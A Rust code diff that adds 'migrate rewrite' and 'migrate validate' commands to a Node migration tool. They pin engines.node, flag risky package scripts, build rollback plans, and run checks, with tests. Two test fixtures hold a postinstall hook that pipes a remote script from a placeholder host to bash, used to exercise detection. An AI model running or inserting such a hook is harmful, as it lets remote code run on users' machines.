@@ -99,25 +99,122 @@ pub struct MigrationAuditReport {
     pub findings: Vec<MigrationAuditFinding>,
 }
 
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, PartialOrd, Ord)]
+#[serde(rename_all = "snake_case")]
+pub enum MigrationRewriteAction {
+    PinNodeEngine,
+    ManualScriptReview,
+    ManifestReadError,
+    ManifestParseError,
+    NoPackageManifest,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct MigrationRewriteEntry {
+    pub id: String,
+    pub path: Option<String>,
+    pub action: MigrationRewriteAction,
+    pub detail: String,
+    pub applied: bool,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct MigrationRollbackEntry {
+    pub path: String,
+    pub original_content: String,
+    pub rewritten_content: String,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct MigrationRewriteReport {
+    pub schema_version: String,
+    pub project_path: String,
+    pub generated_at_utc: String,
+    pub apply_mode: bool,
+    pub package_manifests_scanned: usize,
+    pub rewrites_planned: usize,
+    pub rewrites_applied: usize,
+    pub manual_review_items: usize,
+    pub entries: Vec<MigrationRewriteEntry>,
+    pub rollback_entries: Vec<MigrationRollbackEntry>,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct MigrationRollbackPlan {
+    pub schema_version: String,
+    pub project_path: String,
+    pub generated_at_utc: String,
+    pub apply_mode: bool,
+    pub entry_count: usize,
+    pub entries: Vec<MigrationRollbackEntry>,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum MigrationValidateStatus {
+    Pass,
+    Fail,
+}
+
+impl MigrationValidateStatus {
+    const fn as_str(self) -> &'static str {
+        match self {
+            Self::Pass => "PASS",
+            Self::Fail => "FAIL",
+        }
+    }
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct MigrationValidationCheck {
+    pub id: String,
+    pub passed: bool,
+    pub message: String,
+    pub remediation: Option<String>,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct MigrationValidateReport {
+    pub schema_version: String,
+    pub project_path: String,
+    pub generated_at_utc: String,
+    pub status: MigrationValidateStatus,
+    pub checks: Vec<MigrationValidationCheck>,
+    pub blocking_findings: Vec<MigrationAuditFinding>,
+    pub warning_findings: Vec<MigrationAuditFinding>,
+}
+
+impl MigrationValidateReport {
+    #[must_use]
+    pub const fn is_pass(&self) -> bool {
+        matches!(self.status, MigrationValidateStatus::Pass)
+    }
+}
+
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 enum ScriptFindingKind {
     Risky,
     MissingNodeEngine,
 }
 
-pub fn run_audit(project_path: &Path) -> anyhow::Result<MigrationAuditReport> {
+fn ensure_migration_project_path(project_path: &Path, operation: &str) -> anyhow::Result<()> {
     if !project_path.exists() {
         anyhow::bail!(
-            "migration audit target does not exist: {}",
+            "migration {operation} target does not exist: {}",
             project_path.display()
         );
     }
     if !project_path.is_dir() {
         anyhow::bail!(
-            "migration audit target must be a directory: {}",
+            "migration {operation} target must be a directory: {}",
             project_path.display()
         );
     }
+    Ok(())
+}
+
+pub fn run_audit(project_path: &Path) -> anyhow::Result<MigrationAuditReport> {
+    ensure_migration_project_path(project_path, "audit")?;
 
     let files = collect_project_files(project_path)?;
     let mut findings = Vec::new();
@@ -186,6 +283,327 @@ pub fn render_audit_report(
         AuditOutputFormat::Text => Ok(render_human_audit_report(report)),
         AuditOutputFormat::Sarif => render_sarif(report),
     }
+}
+
+pub fn run_rewrite(project_path: &Path, apply: bool) -> anyhow::Result<MigrationRewriteReport> {
+    ensure_migration_project_path(project_path, "rewrite")?;
+
+    let files = collect_project_files(project_path)?;
+    let mut package_manifests_scanned = 0_usize;
+    let mut rewrites_planned = 0_usize;
+    let mut rewrites_applied = 0_usize;
+    let mut manual_review_items = 0_usize;
+    let mut entries = Vec::new();
+    let mut rollback_entries = Vec::new();
+
+    for path in files {
+        let is_package_manifest = path
+            .file_name()
+            .and_then(std::ffi::OsStr::to_str)
+            .is_some_and(|name| name == "package.json");
+        if !is_package_manifest {
+            continue;
+        }
+
+        package_manifests_scanned += 1;
+        let relative_path = relative_display(project_path, &path);
+        let raw = match std::fs::read_to_string(&path) {
+            Ok(content) => content,
+            Err(err) => {
+                manual_review_items += 1;
+                entries.push(MigrationRewriteEntry {
+                    id: String::new(),
+                    path: Some(relative_path),
+                    action: MigrationRewriteAction::ManifestReadError,
+                    detail: format!("unable to read package manifest: {err}"),
+                    applied: false,
+                });
+                continue;
+            }
+        };
+
+        let mut manifest = match serde_json::from_str::<serde_json::Value>(&raw) {
+            Ok(value) => value,
+            Err(err) => {
+                manual_review_items += 1;
+                entries.push(MigrationRewriteEntry {
+                    id: String::new(),
+                    path: Some(relative_path),
+                    action: MigrationRewriteAction::ManifestParseError,
+                    detail: format!("package manifest JSON parse failed: {err}"),
+                    applied: false,
+                });
+                continue;
+            }
+        };
+
+        for script_name in collect_risky_script_names(&manifest) {
+            manual_review_items += 1;
+            entries.push(MigrationRewriteEntry {
+                id: String::new(),
+                path: Some(relative_path.clone()),
+                action: MigrationRewriteAction::ManualScriptReview,
+                detail: format!("script `{script_name}` requires manual hardening review"),
+                applied: false,
+            });
+        }
+
+        if ensure_node_engine_pin(&mut manifest) {
+            rewrites_planned += 1;
+            let rewritten = serde_json::to_string_pretty(&manifest)
+                .map(|rendered| format!("{rendered}\n"))
+                .map_err(|err| {
+                    anyhow::anyhow!(
+                        "failed serializing rewritten package manifest {}: {err}",
+                        relative_path
+                    )
+                })?;
+
+            if apply {
+                std::fs::write(&path, rewritten.as_bytes()).map_err(|err| {
+                    anyhow::anyhow!(
+                        "failed writing rewritten package manifest {}: {err}",
+                        path.display()
+                    )
+                })?;
+                rewrites_applied += 1;
+            }
+
+            entries.push(MigrationRewriteEntry {
+                id: String::new(),
+                path: Some(relative_path.clone()),
+                action: MigrationRewriteAction::PinNodeEngine,
+                detail: "set engines.node to >=20 <23 to reduce migration runtime drift"
+                    .to_string(),
+                applied: apply,
+            });
+            rollback_entries.push(MigrationRollbackEntry {
+                path: relative_path,
+                original_content: raw,
+                rewritten_content: rewritten,
+            });
+        }
+    }
+
+    if package_manifests_scanned == 0 {
+        manual_review_items += 1;
+        entries.push(MigrationRewriteEntry {
+            id: String::new(),
+            path: None,
+            action: MigrationRewriteAction::NoPackageManifest,
+            detail: "no package.json files found; nothing to rewrite".to_string(),
+            applied: false,
+        });
+    }
+
+    entries.sort_by(|left, right| {
+        left.path
+            .cmp(&right.path)
+            .then_with(|| left.action.cmp(&right.action))
+            .then_with(|| left.detail.cmp(&right.detail))
+    });
+    for (index, entry) in entries.iter_mut().enumerate() {
+        entry.id = format!("mig-rewrite-{:03}", index + 1);
+    }
+
+    Ok(MigrationRewriteReport {
+        schema_version: "1.0.0".to_string(),
+        project_path: project_path.to_string_lossy().replace('\\', "/"),
+        generated_at_utc: chrono::Utc::now().to_rfc3339(),
+        apply_mode: apply,
+        package_manifests_scanned,
+        rewrites_planned,
+        rewrites_applied,
+        manual_review_items,
+        entries,
+        rollback_entries,
+    })
+}
+
+#[must_use]
+pub fn build_rollback_plan(report: &MigrationRewriteReport) -> MigrationRollbackPlan {
+    MigrationRollbackPlan {
+        schema_version: "1.0.0".to_string(),
+        project_path: report.project_path.clone(),
+        generated_at_utc: chrono::Utc::now().to_rfc3339(),
+        apply_mode: report.apply_mode,
+        entry_count: report.rollback_entries.len(),
+        entries: report.rollback_entries.clone(),
+    }
+}
+
+#[must_use]
+pub fn render_rewrite_report(report: &MigrationRewriteReport) -> String {
+    let mut output = String::new();
+    let _ = writeln!(&mut output, "franken-node migrate rewrite");
+    let _ = writeln!(&mut output, "target: {}", report.project_path);
+    let _ = writeln!(
+        &mut output,
+        "mode: {}",
+        if report.apply_mode {
+            "apply"
+        } else {
+            "dry-run"
+        }
+    );
+    let _ = writeln!(
+        &mut output,
+        "summary: manifests={} rewrites_planned={} rewrites_applied={} manual_review_items={}",
+        report.package_manifests_scanned,
+        report.rewrites_planned,
+        report.rewrites_applied,
+        report.manual_review_items
+    );
+
+    if report.entries.is_empty() {
+        let _ = writeln!(&mut output, "entries: none");
+        return output;
+    }
+
+    let _ = writeln!(&mut output, "entries ({}):", report.entries.len());
+    for entry in &report.entries {
+        let _ = writeln!(
+            &mut output,
+            "- [{}:{:?}] {}{} (applied={})",
+            entry.id,
+            entry.action,
+            entry.detail,
+            entry
+                .path
+                .as_ref()
+                .map_or_else(String::new, |path| format!(" (path: {path})")),
+            entry.applied
+        );
+    }
+
+    output
+}
+
+pub fn run_validate(project_path: &Path) -> anyhow::Result<MigrationValidateReport> {
+    let audit = run_audit(project_path)?;
+
+    let blocking_findings = audit
+        .findings
+        .iter()
+        .filter(|finding| matches!(finding.severity, MigrationSeverity::High))
+        .cloned()
+        .collect::<Vec<_>>();
+    let warning_findings = audit
+        .findings
+        .iter()
+        .filter(|finding| matches!(finding.severity, MigrationSeverity::Medium))
+        .cloned()
+        .collect::<Vec<_>>();
+
+    let mut checks = Vec::new();
+    checks.push(MigrationValidationCheck {
+        id: "mig-validate-001".to_string(),
+        passed: audit.summary.package_manifests > 0,
+        message: format!(
+            "package manifests detected: {}",
+            audit.summary.package_manifests
+        ),
+        remediation: Some(
+            "Ensure at least one package.json is present before validation.".to_string(),
+        ),
+    });
+    checks.push(MigrationValidationCheck {
+        id: "mig-validate-002".to_string(),
+        passed: !audit.summary.lockfiles.is_empty(),
+        message: format!("lockfiles detected: {}", audit.summary.lockfiles.len()),
+        remediation: Some(
+            "Commit a lockfile (package-lock.json, pnpm-lock.yaml, yarn.lock, or bun.lockb)."
+                .to_string(),
+        ),
+    });
+    checks.push(MigrationValidationCheck {
+        id: "mig-validate-003".to_string(),
+        passed: audit.summary.risky_scripts == 0,
+        message: format!(
+            "risky install/build scripts: {}",
+            audit.summary.risky_scripts
+        ),
+        remediation: Some(
+            "Remove or harden risky install/build hooks before migration rollout.".to_string(),
+        ),
+    });
+    checks.push(MigrationValidationCheck {
+        id: "mig-validate-004".to_string(),
+        passed: blocking_findings.is_empty(),
+        message: format!("high-severity audit findings: {}", blocking_findings.len()),
+        remediation: Some(
+            "Resolve all high-severity migrate audit findings before validation can pass."
+                .to_string(),
+        ),
+    });
+
+    let status = if checks.iter().all(|check| check.passed) {
+        MigrationValidateStatus::Pass
+    } else {
+        MigrationValidateStatus::Fail
+    };
+
+    Ok(MigrationValidateReport {
+        schema_version: "1.0.0".to_string(),
+        project_path: project_path.to_string_lossy().replace('\\', "/"),
+        generated_at_utc: chrono::Utc::now().to_rfc3339(),
+        status,
+        checks,
+        blocking_findings,
+        warning_findings,
+    })
+}
+
+#[must_use]
+pub fn render_validate_report(report: &MigrationValidateReport) -> String {
+    let mut output = String::new();
+    let _ = writeln!(&mut output, "franken-node migrate validate");
+    let _ = writeln!(&mut output, "target: {}", report.project_path);
+    let _ = writeln!(&mut output, "status: {}", report.status.as_str());
+    let _ = writeln!(
+        &mut output,
+        "summary: checks={} blocking_findings={} warning_findings={}",
+        report.checks.len(),
+        report.blocking_findings.len(),
+        report.warning_findings.len()
+    );
+    let _ = writeln!(&mut output, "checks:");
+    for check in &report.checks {
+        let _ = writeln!(
+            &mut output,
+            "- [{}] {} {}",
+            check.id,
+            if check.passed { "PASS" } else { "FAIL" },
+            check.message
+        );
+        if !check.passed
+            && let Some(remediation) = &check.remediation
+        {
+            let _ = writeln!(&mut output, "  remediation: {remediation}");
+        }
+    }
+
+    if !report.blocking_findings.is_empty() {
+        let _ = writeln!(
+            &mut output,
+            "blocking findings ({}):",
+            report.blocking_findings.len()
+        );
+        for finding in &report.blocking_findings {
+            let _ = writeln!(
+                &mut output,
+                "- [{}] {}{}",
+                finding.id,
+                finding.message,
+                finding
+                    .path
+                    .as_ref()
+                    .map_or_else(String::new, |path| format!(" (path: {path})"))
+            );
+        }
+    }
+
+    output
 }
 
 fn collect_project_files(root: &Path) -> anyhow::Result<Vec<PathBuf>> {
@@ -365,6 +783,48 @@ fn is_risky_script(script_name: &str, command: &str) -> bool {
     ];
 
     install_hook || risky_terms.iter().any(|term| cmd.contains(term))
+}
+
+fn ensure_node_engine_pin(manifest: &mut serde_json::Value) -> bool {
+    let Some(root) = manifest.as_object_mut() else {
+        return false;
+    };
+    let engines = root
+        .entry("engines".to_string())
+        .or_insert_with(|| serde_json::json!({}));
+
+    let Some(engines_obj) = engines.as_object_mut() else {
+        return false;
+    };
+
+    if engines_obj
+        .get("node")
+        .and_then(serde_json::Value::as_str)
+        .is_some_and(|value| !value.trim().is_empty())
+    {
+        return false;
+    }
+
+    engines_obj.insert("node".to_string(), serde_json::json!(">=20 <23"));
+    true
+}
+
+fn collect_risky_script_names(manifest: &serde_json::Value) -> Vec<String> {
+    let mut risky = Vec::new();
+    if let Some(scripts) = manifest
+        .get("scripts")
+        .and_then(serde_json::Value::as_object)
+    {
+        for (script_name, command_value) in scripts {
+            if let Some(command) = command_value.as_str()
+                && is_risky_script(script_name, command)
+            {
+                risky.push(script_name.clone());
+            }
+        }
+    }
+    risky.sort();
+    risky
 }
 
 fn append_summary_findings(
@@ -718,5 +1178,126 @@ mod tests {
             .as_array()
             .map_or(0, std::vec::Vec::len);
         assert_eq!(result_count, 1);
+    }
+
+    #[test]
+    fn run_rewrite_can_apply_node_engine_pin() {
+        let temp = tempfile::tempdir().expect("tempdir");
+        let project = temp.path();
+
+        std::fs::write(project.join("index.js"), "console.log('hello');").expect("write js");
+        std::fs::write(
+            project.join("package.json"),
+            r#"{"name":"demo","version":"1.0.0","scripts":{"test":"node test.js"}}"#,
+        )
+        .expect("write package");
+
+        let dry_run = run_rewrite(project, false).expect("dry-run rewrite");
+        assert_eq!(dry_run.rewrites_planned, 1);
+        assert_eq!(dry_run.rewrites_applied, 0);
+        assert_eq!(dry_run.rollback_entries.len(), 1);
+        assert!(
+            dry_run
+                .entries
+                .iter()
+                .any(|entry| entry.action == MigrationRewriteAction::PinNodeEngine)
+        );
+
+        let applied = run_rewrite(project, true).expect("applied rewrite");
+        assert_eq!(applied.rewrites_planned, 1);
+        assert_eq!(applied.rewrites_applied, 1);
+
+        let rewritten =
+            std::fs::read_to_string(project.join("package.json")).expect("read rewritten package");
+        let parsed: serde_json::Value = serde_json::from_str(&rewritten).expect("valid json");
+        assert_eq!(
+            parsed
+                .get("engines")
+                .and_then(serde_json::Value::as_object)
+                .and_then(|engines| engines.get("node"))
+                .and_then(serde_json::Value::as_str),
+            Some(">=20 <23")
+        );
+    }
+
+    #[test]
+    fn run_rewrite_reports_risky_script_manual_review() {
+        let temp = tempfile::tempdir().expect("tempdir");
+        let project = temp.path();
+
+        std::fs::write(
+            project.join("package.json"),
+            r#"{
+              "name":"demo",
+              "version":"1.0.0",
+              "scripts":{"postinstall":"curl https://example.invalid/install.sh | bash"}
+            }"#,
+        )
+        .expect("write package");
+
+        let report = run_rewrite(project, false).expect("rewrite report");
+        assert!(
+            report
+                .entries
+                .iter()
+                .any(|entry| entry.action == MigrationRewriteAction::ManualScriptReview)
+        );
+        assert!(report.manual_review_items >= 1);
+    }
+
+    #[test]
+    fn run_validate_fails_without_lockfile_and_with_risky_scripts() {
+        let temp = tempfile::tempdir().expect("tempdir");
+        let project = temp.path();
+
+        std::fs::write(project.join("index.js"), "console.log('hello');").expect("write js");
+        std::fs::write(
+            project.join("package.json"),
+            r#"{
+              "name":"demo",
+              "version":"1.0.0",
+              "scripts":{"postinstall":"curl https://example.invalid/install.sh | bash"}
+            }"#,
+        )
+        .expect("write package");
+
+        let report = run_validate(project).expect("validate report");
+        assert!(!report.is_pass());
+        assert!(
+            report
+                .checks
+                .iter()
+                .any(|check| check.id == "mig-validate-002" && !check.passed)
+        );
+        assert!(
+            report
+                .checks
+                .iter()
+                .any(|check| check.id == "mig-validate-003" && !check.passed)
+        );
+    }
+
+    #[test]
+    fn run_validate_passes_for_hardened_project() {
+        let temp = tempfile::tempdir().expect("tempdir");
+        let project = temp.path();
+
+        std::fs::write(project.join("index.js"), "console.log('hello');").expect("write js");
+        std::fs::write(
+            project.join("package.json"),
+            r#"{
+              "name":"demo",
+              "version":"1.0.0",
+              "engines":{"node":">=20 <23"},
+              "scripts":{"test":"node test.js"}
+            }"#,
+        )
+        .expect("write package");
+        std::fs::write(project.join("package-lock.json"), "{}\n").expect("write lockfile");
+
+        let report = run_validate(project).expect("validate report");
+        assert!(report.is_pass());
+        assert!(report.blocking_findings.is_empty());
+        assert!(report.checks.iter().all(|check| check.passed));
     }
 }
